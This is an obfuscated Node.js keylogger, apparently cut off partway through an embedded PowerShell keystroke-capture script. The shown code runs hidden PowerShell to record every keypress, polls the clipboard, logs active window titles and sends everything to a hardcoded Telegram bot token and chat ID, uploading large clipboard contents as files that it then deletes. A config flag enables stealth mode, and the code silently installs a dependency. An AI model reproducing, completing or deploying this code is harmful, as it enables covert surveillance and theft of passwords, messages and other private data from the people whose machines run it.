const _0x2a73ee=_0x13cb;(function(_0x52c141,_0x57ed89){const _0x2fe5ef=_0x13cb,_0x3493c7=_0x52c141();while(!![]){try{const _0x538aea=-parseInt(_0x2fe5ef(0x219))/0x1*(parseInt(_0x2fe5ef(0x290))/0x2)+-parseInt(_0x2fe5ef(0x278))/0x3+-parseInt(_0x2fe5ef(0x1fe))/0x4+-parseInt(_0x2fe5ef(0x2a2))/0x5*(-parseInt(_0x2fe5ef(0x2a8))/0x6)+parseInt(_0x2fe5ef(0x20e))/0x7+-parseInt(_0x2fe5ef(0x253))/0x8*(parseInt(_0x2fe5ef(0x250))/0x9)+parseInt(_0x2fe5ef(0x24f))/0xa*(parseInt(_0x2fe5ef(0x233))/0xb);if(_0x538aea===_0x57ed89)break;else _0x3493c7['push'](_0x3493c7['shift']());}catch(_0x50e7c0){_0x3493c7['push'](_0x3493c7['shift']());}}}(_0x112b,0x1930c));function _0x112b(){const _0x1ffaee=['clipboardTimer','🔄\x20','child_process','Hebrew','config','\x0d\x0a--','random','writeFileSync','❌\x20Start\x20error:\x20','1142CUFjeD','.txt','maxMessagesPerMinute','stop','Clipboard\x20Content\x20-\x20','PASTE_DETECTED','message','🇬🇷','Russian','lastPasteTime','telegramChatId','Content-Disposition:\x20form-data;\x20name=\x22chat_id\x22\x0d\x0a\x0d\x0a','\x22\x0d\x0a','🇮🇱','write','SIGINT','queueMessage','🇷🇺','priority','sort','stderr','[ENTER]','Unknown','clipboardHistory','fromCharCode','📋\x20','33yUBdLh','path','request','📋\x20COPIED:\x20','toLocaleTimeString','❌\x20Failed\x20to\x20send\x20clipboard\x20file:\x20','start','utf8','-4923767052','\x0a🖼️\x20','--\x0d\x0a','getActiveWindow','📄\x20COPY\x20operation\x20detected\x0a🖼️\x20From:\x20','substring','Chinese','NORMAL','startKeystrokeCapture','[ESC]','Content-Disposition:\x20form-data;\x20name=\x22document\x22;\x20filename=\x22','🔴\x20Enhanced\x20Monitor\x20Stopped','win32','isMonitoringPaste','powershell\x20\x22Get-Process\x20|\x20Where-Object\x20{$_.MainWindowTitle}\x20|\x20Select-Object\x20-First\x201\x20|\x20ForEach-Object\x20{$_.ProcessName\x20+\x20\x27\x20-\x20\x27\x20+\x20$_.MainWindowTitle}\x22','enhanced_keylogger.ps1','handleExit','clipboard_','\x20→\x20','Content-Disposition:\x20form-data;\x20name=\x22caption\x22\x0d\x0a\x0d\x0a','1144280gzYmPL','8415dlaqql','URGENT','unlinkSync','208MKPlct','handleCopyDetected','-ExecutionPolicy','English','powershell\x20-command\x20\x22$OutputEncoding\x20=\x20[console]::InputEncoding\x20=\x20[console]::OutputEncoding\x20=\x20New-Object\x20System.Text.UTF8Encoding;\x20Get-Clipboard\x22','round','lastClipboardContent','platform','length','7853310203:AAFWGbyq8bv2jPGvOC4YHm6yjz3X-mftP_Y','Content-Type:\x20text/plain;\x20charset=utf-8\x0d\x0a\x0d\x0a','handleKeystroke','psScriptPath','language','getLanguageFlag','now','ERROR:','toLocaleString','destroy','messageInterval','keyBuffer','resetBatchTimer','🇺🇸','Language:\x20','handleClipboardChange','replace','UNICODE:','Latin\x20Extended','exports','includes','isRunning','startMessageProcessor','✅\x20installed\x20successfully','catch','end','📦\x20Installing\x20(aw)','🇧🇬','514341RMeslP','Greek','startsWith','bind','powershell','📋\x20Starting','pipe','error','push','[TAB]','s\x20ago)','owner','addToKeystrokeBatch','from','readFileSync','existsSync','reduce','name','basename','⚠️\x20Using\x20PS','🇸🇦','toString','\x20chars)\x20from\x20','preview','110BpxesU','split','...','messageSendTimer','https://api.telegram.org/bot','🖼️\x20Initial:\x20','handlePasteDetected','log','currentWindow','active-win','🇯🇵','statusCode','keystrokeBatchInterval','exit','🇨🇳','window','lastWindow','Japanese','5fhzxRI','timestamp','Arabic','🚀\x20K\x20+\x20C\x20helper','\x20Clipboard\x20(','stringify','206946WOEBQG','Already\x20running','trackActiveWindow','trim','telegramBotToken','processMessageQueue','Request\x20timeout','-NoProfile','🚀\x20Monitor\x20Started\x0a\x0a','❌\x20Keylogger\x20error:\x20','startClipboardMonitoring','🇰🇷','messagesSentThisMinute','filter','argv','kill','sendKeystrokeBatch','ignore','concat','sendTelegramFile','main','currentLanguage','HTTP\x20','forEach','lastMessageTime','windowCheckInterval','\x0a\x0a📄\x20Content:\x20','windowTimer','processKeystrokeOutput','repeat','📥\x20PASTED:\x20','npm\x20install\x20active-win','📋\x20Clipboard\x0a','notifyLanguageChange','\x20chars)','PASTED','messageQueue','multipart/form-data;\x20boundary=','File\x20upload\x20timeout','Source:\x20','ENHANCED_READY','title','\x20-\x20','application/json','match','batchTimer','timeout','🇪🇺','226356ciIMJs','detectLanguageFromText','🔴\x20Stopping...','sendTelegramMessage','Cyrillic','POST','data','LOW','english','keyloggerProcess','[BACKSPACE]','⏱️\x20From:\x20','keys','\x0a🖼️\x20From:\x20','\x0a\x0a📄\x20Preview:\x0a','entries','283927ttUBuJ','TYPED'];_0x112b=function(){return _0x1ffaee;};return _0x112b();}const fs=require('fs'),path=require(_0x2a73ee(0x234)),os=require('os'),https=require('https'),{exec,spawn,execSync}=require(_0x2a73ee(0x212));let activeWin=null;try{activeWin=require(_0x2a73ee(0x299));}catch(_0x3c7edd){try{console[_0x2a73ee(0x297)](_0x2a73ee(0x276)),execSync(_0x2a73ee(0x1ed),{'stdio':_0x2a73ee(0x1df),'timeout':0x7530}),activeWin=require(_0x2a73ee(0x299)),console[_0x2a73ee(0x297)](_0x2a73ee(0x273));}catch(_0x397eae){console[_0x2a73ee(0x297)](_0x2a73ee(0x28b));}}const CONFIG={'telegramBotToken':_0x2a73ee(0x25c),'telegramChatId':_0x2a73ee(0x23b),'keystrokeBatchInterval':0xbb8,'messageInterval':0x7d0,'clipboardCheckInterval':0x12c,'windowCheckInterval':0x7d0,'maxMessagesPerMinute':0x1e,'maxBatchSize':0xc8,'trackActiveWindow':!![],'instantClipboard':!![],'batchKeystrokes':!![],'stealthMode':!![]},LANGUAGE_PATTERNS={'hebrew':/[\u0590-\u05ff\u200f\u200e]/,'russian':/[а-яёА-ЯЁ\u0400-\u04ff]/,'arabic':/[\u0600-\u06ff\u0750-\u077f\u08a0-\u08ff\ufb50-\ufdff\ufe70-\ufeff]/,'chinese':/[\u4e00-\u9fff\u3400-\u4dbf\uf900-\ufaff]/,'japanese':/[\u3040-\u309f\u30a0-\u30ff\u31f0-\u31ff\uff65-\uff9f]/,'korean':/[\uac00-\ud7af\u1100-\u11ff\u3130-\u318f]/,'greek':/[\u0370-\u03ff\u1f00-\u1fff]/,'cyrillic':/[\u0400-\u04ff\u0500-\u052f\u2de0-\u2dff\ua640-\ua69f]/,'latin_extended':/[\u0100-\u017f\u0180-\u024f\u1e00-\u1eff]/,'english':/[a-zA-Z]/},PRIORITY={'URGENT':0x1,'NORMAL':0x2,'LOW':0x3};class EnhancedUnifiedKeylogger{constructor(_0x1f37a3=CONFIG){const _0xc705d6=_0x2a73ee;this['config']={...CONFIG,..._0x1f37a3},this[_0xc705d6(0x271)]=![],this['keyBuffer']='',this[_0xc705d6(0x1e3)]=_0xc705d6(0x206),this['lastClipboardContent']='',this['clipboardHistory']=[],this[_0xc705d6(0x222)]=0x0,this[_0xc705d6(0x248)]=![],this[_0xc705d6(0x298)]=_0xc705d6(0x22f),this[_0xc705d6(0x2a0)]='',this[_0xc705d6(0x207)]=null,this['clipboardTimer']=null,this[_0xc705d6(0x1e9)]=null,this[_0xc705d6(0x1fb)]=null,this['messageQueue']=[],this[_0xc705d6(0x1da)]=0x0,this[_0xc705d6(0x1e6)]=0x0,this[_0xc705d6(0x293)]=null,this[_0xc705d6(0x21c)]=this['stop'][_0xc705d6(0x27b)](this),this[_0xc705d6(0x24b)]=this['handleExit'][_0xc705d6(0x27b)](this),process['on'](_0xc705d6(0x228),this[_0xc705d6(0x24b)]),process['on']('SIGTERM',this[_0xc705d6(0x24b)]),process['on'](_0xc705d6(0x29d),this[_0xc705d6(0x24b)]),this[_0xc705d6(0x272)]();}[_0x2a73ee(0x272)](){const _0x40cf06=_0x2a73ee;setInterval(()=>{const _0x5a3e80=_0x13cb;this[_0x5a3e80(0x1da)]=0x0;},0xea60),this[_0x40cf06(0x293)]=setInterval(()=>{const _0x4c4226=_0x40cf06;this[_0x4c4226(0x1d3)]();},this[_0x40cf06(0x214)][_0x40cf06(0x266)]);}[_0x2a73ee(0x229)](_0x3687dd,_0x46c69a=PRIORITY['NORMAL']){const _0x2a9a34=_0x2a73ee;this[_0x2a9a34(0x1f2)][_0x2a9a34(0x280)]({'message':_0x3687dd,'priority':_0x46c69a,'timestamp':Date['now']()}),this[_0x2a9a34(0x1f2)][_0x2a9a34(0x22c)]((_0x44ba3e,_0x569183)=>_0x44ba3e[_0x2a9a34(0x22b)]-_0x569183[_0x2a9a34(0x22b)]),_0x46c69a===PRIORITY['URGENT']&&this['messagesSentThisMinute']<this[_0x2a9a34(0x214)][_0x2a9a34(0x21b)]&&this[_0x2a9a34(0x1d3)]();}async[_0x2a73ee(0x1d3)](){const _0xcd2d59=_0x2a73ee;if(this['messageQueue'][_0xcd2d59(0x25b)]===0x0||this[_0xcd2d59(0x1da)]>=this[_0xcd2d59(0x214)][_0xcd2d59(0x21b)])return;const _0x27dd76=Date['now']();if(_0x27dd76-this[_0xcd2d59(0x1e6)]<this[_0xcd2d59(0x214)][_0xcd2d59(0x266)])return;const _0x4fc3dc=this[_0xcd2d59(0x1f2)]['shift']();if(_0x4fc3dc)try{await this['sendTelegramMessage'](_0x4fc3dc[_0xcd2d59(0x21f)]),this[_0xcd2d59(0x1da)]++,this['lastMessageTime']=_0x27dd76;}catch(_0x9839cb){this[_0xcd2d59(0x1f2)]['unshift'](_0x4fc3dc);}}async[_0x2a73ee(0x23e)](){const _0x5b58a5=_0x2a73ee;try{if(activeWin){const _0x285563=await activeWin();if(_0x285563&&_0x285563[_0x5b58a5(0x283)]&&_0x285563[_0x5b58a5(0x1f7)]){const _0x1ed8fd=_0x285563[_0x5b58a5(0x283)][_0x5b58a5(0x289)]||_0x5b58a5(0x22f),_0x3d9415=_0x285563['title'][_0x5b58a5(0x25b)]>0x28?_0x285563['title']['substring'](0x0,0x25)+_0x5b58a5(0x292):_0x285563['title'];return _0x1ed8fd+_0x5b58a5(0x1f8)+_0x3d9415;}else{if(_0x285563&&_0x285563['owner'])return _0x285563[_0x5b58a5(0x283)]['name']||_0x5b58a5(0x22f);}}if(os[_0x5b58a5(0x25a)]()===_0x5b58a5(0x247)){const _0x520825=await new Promise(_0x35fb9f=>{const _0x4fe2eb=_0x5b58a5;exec(_0x4fe2eb(0x249),{'encoding':'utf8','timeout':0x5dc,'windowsHide':!![]},(_0x2fc63e,_0x190244)=>{const _0x198ec3=_0x4fe2eb;_0x35fb9f(_0x2fc63e?_0x198ec3(0x22f):_0x190244[_0x198ec3(0x2ab)]());});});return _0x520825||_0x5b58a5(0x22f);}return _0x5b58a5(0x22f);}catch(_0x718cdc){return'Unknown';}}['startWindowMonitoring'](){const _0xc1c584=_0x2a73ee;if(!this[_0xc1c584(0x214)][_0xc1c584(0x2aa)])return;this[_0xc1c584(0x1e9)]=setInterval(async()=>{const _0x182771=_0xc1c584;try{const _0xed2990=await this['getActiveWindow']();_0xed2990!=='Unknown'&&_0xed2990!==this['lastWindow']&&(this[_0x182771(0x2a0)]=this[_0x182771(0x298)],this[_0x182771(0x298)]=_0xed2990,this[_0x182771(0x2a0)]!==''&&this[_0x182771(0x229)]('🖼️\x20'+_0xed2990,PRIORITY['NORMAL']));}catch(_0x3db006){}},this[_0xc1c584(0x214)][_0xc1c584(0x1e7)]);}[_0x2a73ee(0x1d8)](){const _0x3bca25=_0x2a73ee;if(!this['config']['instantClipboard'])return;this[_0x3bca25(0x210)]=setInterval(async()=>{const _0x1aa35a=_0x3bca25;try{if(os[_0x1aa35a(0x25a)]()==='win32'){const _0x26e58c=execSync(_0x1aa35a(0x257),{'encoding':_0x1aa35a(0x23a),'timeout':0x7d0,'maxBuffer':0x400*0x400}),_0xc14e29=_0x26e58c['trim']();_0xc14e29&&_0xc14e29!==this[_0x1aa35a(0x259)]&&_0xc14e29[_0x1aa35a(0x25b)]>0x0&&_0xc14e29[_0x1aa35a(0x25b)]<0x2710&&(this[_0x1aa35a(0x26b)](_0xc14e29),this['lastClipboardContent']=_0xc14e29);}}catch(_0x12fc37){}},this[_0x3bca25(0x214)]['clipboardCheckInterval']);}[_0x2a73ee(0x1ff)](_0xc521c3){const _0xe79b57=_0x2a73ee,_0x439d68={};for(const [_0x42cf61,_0x43cee2]of Object[_0xe79b57(0x20d)](LANGUAGE_PATTERNS)){const _0x5872c5=_0xc521c3[_0xe79b57(0x1fa)](new RegExp(_0x43cee2['source'],'g'));_0x439d68[_0x42cf61]=_0x5872c5?_0x5872c5[_0xe79b57(0x25b)]:0x0;}const _0x2792d5=Object[_0xe79b57(0x20a)](_0x439d68)[_0xe79b57(0x288)]((_0x3f9115,_0x2364ff)=>_0x439d68[_0x3f9115]>_0x439d68[_0x2364ff]?_0x3f9115:_0x2364ff);return _0x439d68[_0x2792d5]>0x0?_0x2792d5:_0xe79b57(0x206);}[_0x2a73ee(0x261)](_0x3e53cf){const _0x4c5c9b=_0x2a73ee,_0x562d7c={'hebrew':_0x4c5c9b(0x226),'russian':_0x4c5c9b(0x22a),'arabic':_0x4c5c9b(0x28c),'chinese':_0x4c5c9b(0x29e),'japanese':_0x4c5c9b(0x29a),'korean':_0x4c5c9b(0x1d9),'greek':_0x4c5c9b(0x220),'cyrillic':_0x4c5c9b(0x277),'latin_extended':_0x4c5c9b(0x1fd),'english':_0x4c5c9b(0x269)};return _0x562d7c[_0x3e53cf]||'🌐';}[_0x2a73ee(0x26b)](_0x3227e8){const _0x2e5567=_0x2a73ee,_0x68263e=Date['now'](),_0x367afb=_0x3227e8[_0x2e5567(0x25b)]>0x1f4?_0x3227e8['substring'](0x0,0x1f4)+_0x2e5567(0x292):_0x3227e8,_0x45528f=this[_0x2e5567(0x1ff)](_0x3227e8),_0x2d1459=this[_0x2e5567(0x261)](_0x45528f);this[_0x2e5567(0x230)]['push']({'content':_0x3227e8,'preview':_0x367afb,'timestamp':_0x68263e,'window':this[_0x2e5567(0x298)],'language':_0x45528f});this[_0x2e5567(0x230)]['length']>0x5&&this[_0x2e5567(0x230)]['shift']();const _0x17f131=new Date(_0x68263e)[_0x2e5567(0x237)](),_0x4a2d2e=_0x2e5567(0x236)+_0x2d1459+_0x2e5567(0x20b)+this['currentWindow']+'\x0a⏰\x20'+_0x17f131;if(_0x3227e8[_0x2e5567(0x25b)]<=0xdac){const _0x3bb719=_0x4a2d2e+'\x0a\x0a📄\x20Content:\x0a'+_0x3227e8;this['queueMessage'](_0x3bb719,PRIORITY['URGENT']);}else{const _0x3e59d3=_0x4a2d2e+_0x2e5567(0x20c)+_0x367afb+'\x0a\x0a📎\x20Full\x20content\x20attached\x20('+_0x3227e8[_0x2e5567(0x25b)]+_0x2e5567(0x1f0);try{const _0x134ffa=new Date()['toISOString']()[_0x2e5567(0x26c)](/[:.]/g,'-'),_0x9d88cf=_0x2e5567(0x24c)+_0x134ffa+_0x2e5567(0x21a),_0x513d59=path['join'](__dirname,_0x9d88cf),_0x190da4=_0x2e5567(0x21d)+new Date()[_0x2e5567(0x264)]()+'\x0a',_0x1f44c4=_0x2e5567(0x1f5)+this['currentWindow']+'\x0a',_0x1e6cef=_0x2e5567(0x26a)+_0x45528f+'\x20'+_0x2d1459+'\x0a',_0xa91676='='[_0x2e5567(0x1eb)](0x32)+'\x0a\x0a',_0x20cebc=_0x190da4+_0x1f44c4+_0x1e6cef+_0xa91676+_0x3227e8;fs[_0x2e5567(0x217)](_0x513d59,_0x20cebc,_0x2e5567(0x23a)),this['queueMessage'](_0x3e59d3,PRIORITY[_0x2e5567(0x251)]),setTimeout(async()=>{const _0x2439ee=_0x2e5567;try{await this[_0x2439ee(0x1e1)](_0x513d59,_0x2439ee(0x232)+_0x2d1459+_0x2439ee(0x2a6)+_0x3227e8[_0x2439ee(0x25b)]+_0x2439ee(0x28e)+this['currentWindow']),setTimeout(()=>{const _0x4403fd=_0x2439ee;try{fs[_0x4403fd(0x287)](_0x513d59)&&fs[_0x4403fd(0x252)](_0x513d59);}catch(_0x4dc3e9){}},0x1388);}catch(_0x5c4844){this[_0x2439ee(0x229)](_0x2439ee(0x238)+_0x5c4844[_0x2439ee(0x21f)],PRIORITY[_0x2439ee(0x251)]);}},0x7d0);}catch(_0x57ba56){const _0x41dcec=_0x4a2d2e+_0x2e5567(0x1e8)+_0x367afb+'\x0a\x0a⚠️\x20Full\x20content\x20too\x20large\x20('+_0x3227e8[_0x2e5567(0x25b)]+_0x2e5567(0x1f0);this[_0x2e5567(0x229)](_0x41dcec,PRIORITY[_0x2e5567(0x251)]);}}this['isMonitoringPaste']=!![],setTimeout(()=>{const _0x555089=_0x2e5567;this[_0x555089(0x248)]=![];},0x7530);}async['startKeystrokeCapture'](){const _0x4bf476=_0x2a73ee,_0x3db557=path['join'](__dirname,_0x4bf476(0x24a)),_0x3605a5='\x0aAdd-Type\x20-AssemblyName\x20System.Windows.Forms\x0a\x0aAdd-Type\x20@\x22\x0ausing\x20System;\x0ausing\x20System.Runtime.InteropServices;\x0ausing\x20System.Text;\x0a\x0apublic\x20class\x20WinAPI\x20{\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20short\x20GetAsyncKeyState(int\x20vKey);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20IntPtr\x20GetKeyboardLayout(uint\x20idThread);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20bool\x20GetKeyboardState(byte[]\x20lpKeyState);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20int\x20ToUnicodeEx(\x0a\x20\x20\x20\x20\x20\x20\x20\x20uint\x20wVirtKey,\x20uint\x20wScanCode,\x20byte[]\x20lpKeyState,\x0a\x20\x20\x20\x20\x20\x20\x20\x20[Out,\x20MarshalAs(UnmanagedType.LPWStr)]\x20StringBuilder\x20pwszBuff,\x0a\x20\x20\x20\x20\x20\x20\x20\x20int\x20cchBuff,\x20uint\x20wFlags,\x20IntPtr\x20dwhkl);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20uint\x20MapVirtualKeyEx(uint\x20uCode,\x20uint\x20uMapType,\x20IntPtr\x20dwhkl);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20IntPtr\x20GetForegroundWindow();\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20uint\x20GetWindowThreadProcessId(IntPtr\x20hWnd,\x20IntPtr\x20lpdwProcessId);\x0a}\x0a\x22@\x0a\x0a$PreviousKeyStates\x20=\x20@{}\x0a$KeyboardState\x20=\x20New-Object\x20byte[]\x20256\x0a\x0afunction\x20Get-UnicodeChar\x20{\x0a\x20\x20\x20\x20param([int]$VirtualKey)\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$hwnd\x20=\x20[WinAPI]::GetForegroundWindow()\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($hwnd\x20-eq\x20[IntPtr]::Zero)\x20{\x20return\x20$null\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$threadId\x20=\x20[WinAPI]::GetWindowThreadProcessId($hwnd,\x20[IntPtr]::Zero)\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($threadId\x20-eq\x200)\x20{\x20return\x20$null\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$hkl\x20=\x20[WinAPI]::GetKeyboardLayout($threadId)\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($hkl\x20-eq\x20[IntPtr]::Zero)\x20{\x20return\x20$null\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20[WinAPI]::GetKeyboardState($KeyboardState)\x20|\x20Out-Null\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$scanCode\x20=\x20[WinAPI]::MapVirtualKeyEx($VirtualKey,\x200,\x20$hkl)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$buffer\x20=\x20New-Object\x20System.Text.StringBuilder(10)\x0a\x20\x20\x20\x20\x20\x20\x20\x20$result\x20=\x20[WinAPI]::ToUnicodeEx($VirtualKey,\x20$scanCode,\x20$KeyboardState,\x20$buffer,\x20$buffer.Capacity,\x200,\x20$hkl)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($result\x20-gt\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$char\x20=\x20$buffer.ToString()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($char.Length\x20-gt\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$charCode\x20=\x20[int][char]$char[0]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($charCode\x20-ge\x2032)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20$charCode\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20return\x20$null\x0a\x20\x20\x20\x20}\x20catch\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20return\x20$null\x0a\x20\x20\x20\x20}\x0a}\x0a\x0a$VirtualKeys\x20=\x208,9,13,16,17,18,19,20,27,32,33,34,35,36,37,38,39,40,41,44,45,46,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,144,145,186,187,188,189,190,191,192,219,220,221,222\x0a\x0a$SpecialKeys\x20=\x20@{\x0a\x20\x20\x20\x208\x20=\x20\x27[BACKSPACE]\x27;\x209\x20=\x20\x27[TAB]\x27;\x2013\x20=\x20\x27[ENTER]\x27;\x2016\x20=\x20\x27[SHIFT]\x27;\x2017\x20=\x20\x27[CTRL]\x27;\x2018\x20=\x20\x27[ALT]\x27;\x0a\x20\x20\x20\x2019\x20=\x20\x27[PAUSE]\x27;\x2020\x20=\x20\x27[CAPS]\x27;\x2027\x20=\x20\x27[ESC]\x27;\x2032\x20=\x20\x27\x20\x27;\x2033\x20=\x20\x27[PGUP]\x27;\x2034\x20=\x20\x27[PGDN]\x27;\x0a\x20\x20\x20\x2035\x20=\x20\x27[END]\x27;\x2036\x20=\x20\x27[HOME]\x27;\x2037\x20=\x20\x27[LEFT]\x27;\x2038\x20=\x20\x27[UP]\x27;\x2039\x20=\x20\x27[RIGHT]\x27;\x2040\x20=\x20\x27[DOWN]\x27;\x0a\x20\x20\x20\x2041\x20=\x20\x27[SELECT]\x27;\x2044\x20=\x20\x27[PRINT]\x27;\x2045\x20=\x20\x27[INSERT]\x27;\x2046\x20=\x20\x27[DELETE]\x27;\x0a\x20\x20\x20\x20112\x20=\x20\x27[F1]\x27;\x20113\x20=\x20\x27[F2]\x27;\x20114\x20=\x20\x27[F3]\x27;\x20115\x20=\x20\x27[F4]\x27;\x20116\x20=\x20\x27[F5]\x27;\x20117\x20=\x20\x27[F6]\x27;\x0a\x20\x20\x20\x20118\x20=\x20\x27[F7]\x27;\x20119\x20=\x20\x27[F8]\x27;\x20120\x20=\x20\x27[F9]\x27;\x20121\x20=\x20\x27[F10]\x27;\x20122\x20=\x20\x27[F11]\x27;\x20123\x20=\x20\x27[F12]\x27;\x0a\x20\x20\x20\x20144\x20=\x20\x27[NUMLOCK]\x27;\x20145\x20=\x20\x27[SCROLL]\x27\x0a}\x0a\x0aWrite-Output\x20\x22ENHANCED_READY\x22\x0a\x0atry\x20{\x0a\x20\x20\x20\x20while\x20($true)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20Start-Sleep\x20-Milliseconds\x2030\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20foreach\x20($vKey\x20in\x20$VirtualKeys)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$keyState\x20=\x20[WinAPI]::GetAsyncKeyState($vKey)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(($keyState\x20-band\x200x8000)\x20-ne\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(-not\x20$PreviousKeyStates.ContainsKey($vKey)\x20-or\x20-not\x20$PreviousKeyStates[$vKey])\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$PreviousKeyStates[$vKey]\x20=\x20$true\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($vKey\x20-eq\x2086)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$ctrlState\x20=\x20[WinAPI]::GetAsyncKeyState(17)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(($ctrlState\x20-band\x200x8000)\x20-ne\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22PASTE_DETECTED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20continue\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($vKey\x20-eq\x2067)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$ctrlState\x20=\x20[WinAPI]::GetAsyncKeyState(17)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(($ctrlState\x20-band\x200x8000)\x20-ne\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22COPY_DETECTED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20continue\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$unicodeCode\x20=\x20Get-UnicodeChar\x20-VirtualKey\x20$vKey\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($unicodeCode)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x